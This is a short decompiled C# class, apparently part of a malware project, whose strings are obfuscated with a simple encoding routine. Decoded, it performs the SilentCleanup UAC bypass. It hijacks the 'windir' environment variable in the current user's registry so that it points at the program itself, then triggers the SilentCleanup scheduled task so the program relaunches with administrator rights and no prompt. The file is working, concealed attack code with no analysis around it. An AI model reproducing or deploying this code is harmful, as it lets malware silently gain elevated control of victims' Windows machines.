using System;
using System.Diagnostics;
using Microsoft.Win32;

namespace Peg.ICARUS
{
	public class bita
	{
		public bita()
		{
			if (AlphaAndOmega.IsAdmin())
			{
				return;
			}
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(AlphaAndOmega.BCutEncrypt("Od|cxedgod~"));
				registryKey.SetValue(AlphaAndOmega.BCutEncrypt("}cdncx"), AlphaAndOmega.BCutEncrypt("ign$oro*") + AlphaAndOmega.BCutEncrypt("%a*Y^KX^*") + Process.GetCurrentProcess().MainModule.FileName + AlphaAndOmega.BCutEncrypt("*,*ORC^"));
				registryKey.Close();
				Process process = new Process();
				process.StartInfo.FileName = AlphaAndOmega.BCutEncrypt("yib~kyay$oro");
				process.StartInfo.Arguments = AlphaAndOmega.BCutEncrypt("%x\u007fd*%~d*VVGcixeyel~VV]cdne}yVVNcyaIfokd\u007fzVVYcfod~Ifokd\u007fz*%C");
				process.Start();
				Environment.Exit(0);
			}
			catch
			{
			}
		}
	}
}
